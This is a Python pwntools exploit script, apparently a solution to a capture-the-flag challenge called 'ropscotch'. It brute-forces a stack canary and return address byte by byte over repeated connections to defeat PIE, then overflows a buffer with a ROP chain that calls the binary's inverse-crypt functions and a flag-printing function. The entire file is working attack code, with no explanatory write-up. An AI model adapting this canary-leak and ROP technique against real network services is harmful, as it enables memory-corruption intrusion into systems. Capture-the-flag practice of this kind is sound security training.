#!/usr/bin/env python3

from pwn import *

gdbscript = '''
b *0x0000555555555f46
continue
'''
pwn = './ropscotch'
host = 'ropscotch.wpi-ctf-2022-codelab.kctf.cloud'
port = 1337

elf = context.binary = ELF(pwn)
buffer = 0x200 - 4

context.log_level = 'critical'
context.timeout = 2

def start():
	if args.GDB:
		return gdb.debug(pwn,gdbscript=gdbscript)
	elif args.REMOTE:
		return remote(host,port)
	else:
		return remote('localhost',1337)

def leak(addend):
	data = b''
	while True:
		if len(data) == 8:
			break
		for j in range(0,256):
			io = start()
			try:
				io.recvline()
				io.send(b'init' + b'A'*buffer + addend + data + p8(j))
				io.recvline()
				io.recvline()
				io.recvline()
				io.recvline()
				resp = io.recvline()
				if b'Waiting for your next message...' in resp:
					data += p8(j)
					print(f'byte discovered: {p8(j)}')
					break
				io.close()
			except:
				io.close()
				pass
	return data

# crypt stages 5 -> 2 -> 1 -> 4 -> 3


canary = leak(b'')
print(f'canary leaked: {canary[::-1]}')
#normally returns to (handle_connection + 359)
ret = leak(canary + p64(0xdeadbeef))
elf.address = u64(ret) - (elf.sym.handle_connection + 359)
print(f'pie leaked: {elf.address}')

io = start()

payload  = b'init' + b'A'*buffer + canary + p64(0xdeadbeef)
payload += p64(elf.sym.convenient_inverse_crypt_stage5)
payload += p64(elf.sym.convenient_inverse_crypt_stage2)
payload += p64(elf.sym.convenient_inverse_crypt_stage1)
payload += p64(elf.sym.convenient_inverse_crypt_stage4)
payload += p64(elf.sym.convenient_inverse_crypt_stage3)
payload += p64(elf.sym.print_real_flag)

io.recvline()
io.sendline(payload)
io.interactive()
#sleep(1)
#io.sendafter(b'message...\n',b'init' + b'A'*buffer + )
